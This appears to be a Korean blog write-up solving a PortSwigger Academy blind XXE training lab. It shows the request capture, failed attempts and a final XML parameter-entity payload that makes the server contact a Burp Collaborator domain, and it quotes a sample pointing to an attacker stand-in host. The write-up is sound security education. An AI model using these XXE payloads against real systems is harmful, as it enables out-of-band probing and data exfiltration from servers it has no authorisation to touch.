---
layout: post
title: "Burp Academy 문제풀이 - Blind XXE with out-of-band interaction via XML parameter entities"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE]
toc: true
---

# 개요
- Blind XXE 문제인데 XML의 파라메터 엔터티(Parameter Entity)를 통해 out-of-band 통신을 발생시키는 예제로 보인다. 
- 문제 주소: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
- 블라인드 XXE 설명 주소: https://portswigger.net/web-security/xxe/blind
- 난이도: PRACTITIONER (중간)

# 문제분석
- 이전 문제와 마찬가지로 "Check stock" 기능으로 XXE가 가능하다. 
- HTTP 응답으로 에러 발생등의 결과는 알 수 없는 것 같다. 
- 그리고 일반적인 external entities 가 포함된 요청은 블록하고 있다고 한다. 
- 파라메터 엔터티를 통해 문제 서버의 XML 파서가 외부도메인에 대해 DNS쿼리를 질의하도록 만들면 된다. 
- DNS 요청이 발생했다는 것을 알기 위해서 Burp Collaborator 서버를 사용한다. 
- PortSwigger사의 [Burp Collaborator 설명](https://portswigger.net/burp/documentation/collaborator){:target="_blank"}에서 알 수 있듯이, 디폴트 Burp Collaborator 서버의 도메인 `*.burpcollaborator.net` 또는  `*.oastify.com` 를 사용한다. 

```
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
```

# 풀이 

## XXE 가능한 곳 발견
이전 문제들과 마찬가지로 "Check stock" 버튼 클릭시 발생하는 POST 요청의 바디 부분이 XML로 되어 있는 것을 발견했다. 

```
POST /product/stock HTTP/1.1
Host: 0aa30080038a706fc050bdf600870025.web-security-academy.net
Cookie: session=K72hbA7QeOP5dlNcdWpw31bGKKqWACeB
Content-Length: 107
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://0aa30080038a706fc050bdf600870025.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa30080038a706fc050bdf600870025.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ko;q=0.8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>
```

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 3

568
```

## 1차 시도 
다음과 같이 `xxetest.burpcollaborator.net` 에 대한 요청을 보내는 페이로드를 사용해 봤다. 

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://xxetest.burpcollaborator.net"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

호오... 엔터티는 보안 이유상 사용하지 못하도록 되어 있다고 한다.   

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 47

"Entities are not allowed for security reasons"
```

문제 설명에 따르면 External 엔터티는 사용하지 못하지만 Parameter 엔터티라고 하는 것은 사용가능한 것 같다. Parameter 엔터티를 어떻게 사용하는지 알아보자.  

Burp Academy의 [Blind XXE 설명 페이지](https://portswigger.net/web-security/xxe/blind) 에 따르면 `%` 를 사용해서 Parameter 엔터티의 선언 및 사용을 할 수 있다고 한다.  예를 들면 다음과 같은 식이다. 
- 변수명 앞에 `%`를 붙인다. 
- 참조할 때도 `&`가 아니라 `%`로 참조한다. 

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

## 2차 시도 
다음과 같이 Parameter 엔터티를 선언하고 참조하도록 바꿔보았다. 

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://xxetest.burpcollaborator.net"> ] >
<stockCheck>
	<productId>%xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

잘못된 product ID라고 한다. Parameter 엔터티를 사용해서 XXE가 가능한 것 같다. 조금 정답에 근접한 것 같다. productID를 `%xxe;` 로 참조하는 부분을 바꿔보자. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 20

"Invalid product ID"
```

## 3차 시도 
다시 한번 샘플 페이로드를 살펴 보자.   
`%xxe;` 참조가 `<!DOCTYPE>` 을 정의하는 엘레먼트에 들어가 있는 것을 알 수 있다. 

```xml 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

페이로드를 다음과 같이 변경했다. 

```xml 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://xxetest.burpcollaborator.net"> %xxe;] >
<stockCheck>
	<productId>2</productId>
	<storeId>1</storeId>
</stockCheck>
```

XML 파싱 에러가 발생했다는 응답이 돌아온다. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 19

"XML parsing error"
```

![Blind XXE Repater](/images/burp-academy-xxe-4-repeater.png)

여기서 웹 페이지를 보면 성공했다는 메세지가 보인다! 

![Blind XXE 성공](/images/burp-academy-xxe-4-success.png)


